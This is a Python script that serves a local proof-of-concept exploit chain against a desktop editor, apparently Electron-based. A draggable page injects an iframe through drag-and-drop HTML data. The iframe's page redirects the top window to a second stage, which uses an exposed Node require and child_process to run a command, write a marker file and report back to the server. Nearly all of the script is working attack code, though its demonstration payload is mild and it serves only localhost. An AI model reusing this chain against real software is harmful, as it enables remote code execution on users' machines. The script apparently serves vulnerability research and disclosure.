#!/usr/bin/env python3
import json
import os
import sys
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("DRAG_HTTP_PORT", "18765"))
LOG_PATH = os.environ.get("HTTP_LOG_PATH", "/tmp/native-html-drag-http.jsonl")

def append(obj):
    obj = {"time": time.time(), **obj}
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(json.dumps(obj, sort_keys=True) + "\n")

SOURCE = r'''<!doctype html><meta charset="utf-8">
<title>DRAG_SOURCE_READY</title>
<style>
html,body { margin:0; height:100%; background:#f1f5f9; font:20px system-ui; overflow:hidden }
#drag { position:fixed; left:65px; top:105px; width:440px; height:300px;
 display:flex; align-items:center; justify-content:center; text-align:center;
 color:white; background:#7c3aed; border:8px solid #4c1d95; border-radius:25px;
 user-select:none; -webkit-user-drag:element; }
</style>
<div id="drag" draggable="true">HTML-only native drag source<br>Drag to the large green editor input</div>
<script>
const payload = '<iframe id="injectedFrame" src="http://127.0.0.1:18765/stage-a" style="width:420px;height:260px;border:3px solid red"></iframe>';
const drag = document.getElementById('drag');
drag.addEventListener('dragstart', ev => {
  ev.dataTransfer.clearData();
  ev.dataTransfer.setData('text/html', payload);
  ev.dataTransfer.effectAllowed = 'copy';
  const types = Array.from(ev.dataTransfer.types);
  document.title = 'DRAGSTART:' + types.join(',');
  navigator.sendBeacon('/log?event=dragstart&types=' + encodeURIComponent(JSON.stringify(types)));
});
drag.addEventListener('dragend', ev => {
  navigator.sendBeacon('/log?event=dragend&effect=' + encodeURIComponent(ev.dataTransfer.dropEffect));
});
</script>'''

STAGE_A = r'''<!doctype html><meta charset="utf-8"><title>STAGE_A</title>
<body style="background:#fee2e2;font:18px system-ui">Stage A iframe loaded</body>
<script>
fetch('/log?event=stage-a-loaded&href='+encodeURIComponent(location.href), {mode:'no-cors'});
setTimeout(() => { top.location.href='http://localhost:18765/stage-b'; }, 350);
</script>'''

STAGE_B = r'''<!doctype html><meta charset="utf-8"><title>STAGE_B_LOADING</title>
<body style="background:#fef3c7;font:18px system-ui">Stage B top navigation</body>
<script>
(async () => {
  let rec = { event:'stage-b-loaded', href:location.href, requireType:typeof require,
              processType:typeof process, runtimeType:typeof window.editorRuntime };
  try {
    if (typeof require === 'function') {
      const fs = require('fs');
      const cp = require('child_process');
      const out = cp.execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
      const marker = process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-drag-rce';
      fs.writeFileSync(marker, out + '\n');
      rec.marker = marker; rec.id = out;
    }
  } catch (e) { rec.error = String(e && e.stack || e); }
  document.title = 'STAGE_B:req=' + rec.requireType + ':marker=' + Boolean(rec.marker);
  try { await fetch('http://127.0.0.1:18765/log?record='+encodeURIComponent(JSON.stringify(rec)), {mode:'no-cors'}); } catch(e) {}
})();
</script>'''

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(p.query)
        append({"path": p.path, "host": self.headers.get("Host"), "query": q})
        if p.path in ("/", "/source"):
            body = SOURCE.encode()
        elif p.path == "/stage-a":
            body = STAGE_A.encode()
        elif p.path == "/stage-b":
            body = STAGE_B.encode()
        elif p.path == "/log":
            body = b"ok"
        else:
            self.send_response(404); self.end_headers(); return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers(); self.wfile.write(body)
    def log_message(self, fmt, *args):
        pass

append({"event":"server-start", "port":PORT})
print(f"READY http://127.0.0.1:{PORT}/source", flush=True)
ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
